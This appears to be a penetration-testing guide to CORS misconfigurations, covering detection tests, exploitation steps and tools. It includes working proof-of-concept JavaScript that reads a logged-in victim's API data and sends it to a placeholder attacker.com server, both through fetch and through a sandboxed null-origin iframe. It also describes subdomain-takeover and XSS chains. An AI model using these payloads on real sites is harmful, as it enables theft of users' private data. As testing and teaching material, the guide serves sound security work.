# CORS Misconfigurations

## Overview
Cross-Origin Resource Sharing (CORS) is a browser mechanism that allows controlled access to resources across different origins. When misconfigured, it can allow malicious websites to read sensitive data from authenticated users, effectively bypassing the Same-Origin Policy (SOP).

## When This Happens

You should test for CORS misconfigurations when:

- The application uses APIs consumed by different domains or subdomains.
- You see `Access-Control-Allow-Origin` headers in responses.
- The application handles sensitive data via XHR/fetch requests (profile info, tokens, financial data).
- The application has a microservices architecture with cross-origin communication.

## Recon / Detection

### 1. Check for dynamic origin reflection
Send a request with a custom `Origin` header and observe the response:

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user
```

Look for:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

If the server reflects your origin **and** allows credentials, it's vulnerable.

### 2. Test origin validation patterns

| Test Origin | What it detects |
|-------------|----------------|
| `https://evil.com` | No validation (reflects any origin) |
| `null` | Null origin accepted (sandboxed iframes) |
| `https://target.com.evil.com` | Suffix matching only |
| `https://eviltarget.com` | Substring matching |
| `https://sub.target.com` | Subdomain wildcard |
| `https://target.com%60evil.com` | Parser differential |

### 3. Check credentials flag
The vulnerability is exploitable only if **both** are true:
- `Access-Control-Allow-Origin` reflects attacker origin
- `Access-Control-Allow-Credentials: true`

Without credentials, the attacker cannot steal authenticated data.

## Exploitation Steps

### 1. Classic CORS exploitation — credential theft

The server reflects any origin with credentials:

```html
<script>
  fetch('https://target.com/api/me', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate to attacker server
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

Host this on `attacker.com`. When a logged-in victim visits, their browser sends the request with cookies, and the response (containing sensitive data) is readable by the attacker's script.

### 2. Null origin exploitation

Some applications whitelist the `null` origin. This can be triggered from:
- Sandboxed iframes: `<iframe sandbox="allow-scripts" src="data:text/html,...">`
- Local files (`file://`)
- Redirects

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/user', {credentials:'include'})
    .then(r=>r.text())
    .then(d=>location='https://attacker.com/log?data='+btoa(d))
  </script>">
</iframe>
```

### 3. Subdomain takeover + CORS chain

If CORS allows `*.target.com` and you find a dangling subdomain:
1. Take over the subdomain (e.g., `abandoned.target.com`).
2. Host a CORS exploitation page there.
3. Since the origin is trusted, you can steal credentials.

### 4. CORS + XSS = Account takeover

If you find XSS on a trusted origin (even low-impact self-XSS), combine it with CORS:
- XSS on `app.target.com` → execute fetch to `api.target.com` → read sensitive data.
- This elevates a minor XSS into a full data exfiltration attack.

## Example Payloads

**Test for reflection:**
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/sensitive
curl -H "Origin: null" -I https://target.com/api/sensitive
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api/sensitive
```

**PoC HTML:**
```html
<!DOCTYPE html>
<html>
<body>
<h2>CORS PoC</h2>
<div id="result"></div>
<script>
  fetch('https://target.com/api/me', { credentials: 'include' })
    .then(r => r.json())
    .then(data => {
      document.getElementById('result').innerText = JSON.stringify(data, null, 2);
    });
</script>
</body>
</html>
```

## Tools

- **Burp Suite**: Add `Origin` header in Repeater; use the Active Scan CORS check.
- **curl**: Quick manual testing of CORS headers.
- **CORScanner**: Automated CORS misconfiguration scanner.
- **Browser DevTools**: Network tab → check response headers for CORS.

## Real-World Notes

- CORS misconfigurations are very common in SPAs and API-first architectures where developers add permissive CORS to "make things work" during development and forget to tighten it.
- The `Access-Control-Allow-Credentials: true` flag is the critical enabler — without it, the browser won't send cookies, making most attacks impractical.
- CORS + XSS is a powerful chain: even a minor XSS on a trusted subdomain can escalate to full data theft if CORS trusts that subdomain.
- Always document: the exact `Origin` you sent, the exact `Access-Control-*` headers received, and a working PoC HTML page.

## References

- `techniques/xss-techniques.md`
- `methodology/web-recon-methodology.md`
- `tools/recon-tools.md`
